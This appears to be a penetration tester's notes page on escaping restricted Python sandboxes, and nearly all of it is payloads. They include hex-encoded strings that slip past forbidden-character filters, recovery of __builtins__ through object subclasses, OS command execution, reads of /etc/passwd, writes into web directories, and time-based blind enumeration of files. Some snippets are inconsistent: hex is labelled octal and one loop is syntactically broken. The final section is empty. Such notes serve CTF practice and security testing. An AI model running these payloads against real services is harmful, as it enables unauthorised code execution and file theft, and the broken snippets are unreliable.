# Bypass Python Sandbox

## Bypass forbidden characters

* We can encode forbidden characters in their encoded form. Here we used hex encoded as it works smoothly as compared to octal encoding.
* Target command
  * `exec("print('RCE'); __import__('os').system('ls')")`
* Updated command, after converting payload to octal
  * `exec("\x5bi for i in \x28)\x2e\x5f\x5fclass\x5f\x5f\x2e\x5f\x5fbases\x5f\x5f\x5b0]\x2e\x5f\x5fsubclasses\x5f\x5f\x28) if i\x2e\x5f\x5fname\x5f\x5f=='catch\x5fwarnings']\x5b0]\x28)\x2e\x5fmodule\x2e\x5f\x5fbuiltins\x5f\x5f")`

## Alternative.to commands

* You can perform a task in multiple ways, below is a list of all different ways used to perform the same action.

```python
### Command execution and file read ##########################
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls") 
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.popen("ls").read()
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')


### importing libraries ########################################
# 1
import os
from os import *
__import__('os').system("ls")

# 2
sys.modules["os"].system("ls")

#3 - python2
execfile('/usr/lib/python2.7/os.py')
system('ls')

```

## Python Builtins

### If Python builtins present

* In python version 2.7.18
  * `__builtin__` is a module that stores all built in functions.
  * Both `__builtin__` and `__builtins__` are exactly the same
  * You could print all built in functions using `dir(__builtin__)`
  * All functions except print will work normally, to execute print normally you need to first run `from __future__ import print_function`
* Examples
  * `import __builtin__`
    * Loading \_\_builtin\_\_ module
  * `__builtin__.len("hello")`
  * `__builtin__.range(1,20)`
  * `__builtin__.print("hello")`
  * `from __future__ import print_function`
  * `__builtin__.print("hello")`
  * `__builtin__.__dict__['__import__']("os").system("ls")`

![](../../.gitbook/assets/image%20%28138%29.png)

* Some more builtin
  * `__builtin__.__dict__['__import__']("os").system("ls")`

### If No builtin module : python2 present

* Restore builtin using its sub-modules
  * `__builtins__ = [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__`
  * `__builtins__['__import__']('os').system('whoami')`
* other methods

```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could recover __builtins__ in make eveything easier
__builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
__builtins__["__import__"]('os').system('ls')

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```

### if No builtin module : python3

* `get_flag.__globals__['__builtins__'].__import__("os").system("ls")`

## Time Commands list

* Ref : [https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes\#executing-python-code](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes#executing-python-code)

```text
# time.sleep
{}.__class__.__base__.__subclasses__()[59]()._module.__builtins__["__import__"]("time").sleep(100)

# You can also multiline the above command
i={}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
i('time').sleep(3)

# hex encode of some special chars of the above command (multiline)
i={}\x2e\x5f\x5fclass\x5f\x5f\x2e\x5f\x5fbase\x5f\x5f\x2e\x5f\x5fsubclasses\x5f\x5f\x28)\x5b59]\x28)\x2e\x5fmodule\x2e\x5f\x5fbuiltins\x5f\x5f\x5b'\x5f\x5fimport\x5f\x5f']\ni\x28'time')\x2esleep\x283)

# Command for system.sleep(100)
{}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('sleep 3')

```

## Restore builtins and execute OS command

```text

# Restore builtin
__builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
__builtins__["__import__"]('os').system('ls')



### To execute + read output

# Print all available function in __builtins__
print(__builtins__)

# len()
size = __builtins__['len']('String len is 16')

# import os; os.popen('ls').read()
lsfiles = __builtins__['__import__']('os').popen('ls').read()

# python2 print current working directory os.getcwd()
cdir = lfiles = __builtins__['__import__']('os').getcwd()

# GUESS : Number of files in current directory < 30
for n in range(0,30):                                                  # This will be on attacker side
    print(" If program paused now, then number of files is : "+str(n)) # This will be on attacker side
    if __builtins__['__import__']('os').listdir(cdir).__len__()==n:
        __builtins__['__import__']('time').sleep(20)

# GUESS : Length of each file name, say ndir=4
ndir=4
for file_index in range(0,ndir):
    for n in range(0,30):
        print("If program paused now, then " + file_index + "file name len() is : " + n)
        __builtins__['__import__']('os').listdir(cdir)[file_index]==n:
            __builtins__['__import__']('time').sleep(20)


# GUESS : File names len<20 given path and number of files
import string                                                # This will be on attacker side
char_set = string.ascii_letters + '0123456789' + '/-\n'      # This will be on attacker side
flag = 0
for file_index in range(0,ndir):                             # This will be on attacker side
    flag = 0
    for char_index in range(0,20):                           # This will be on attacker side
        for ele in char_set:                                 # This will be on attacker side
            if __builtins__['__import__']('os').listdir(cdir)[file_index][char_index]==ele:
                # __builtins__['__import__']('time').sleep(20)                                 # Real command
                print(str(file_index) + "file name is : " + ele + "\n")                             # For simplicity of this.
                if(ele == '\n'):
                    flag=1
                    break
        if (flag ==1):
            break


```

![Number of files in current working directory](../../.gitbook/assets/image%20%28154%29.png)

```text
# Get present working directory
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').getcwd()

# Execute ls
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
```

## Limiting commands to 300 characters

```text

```

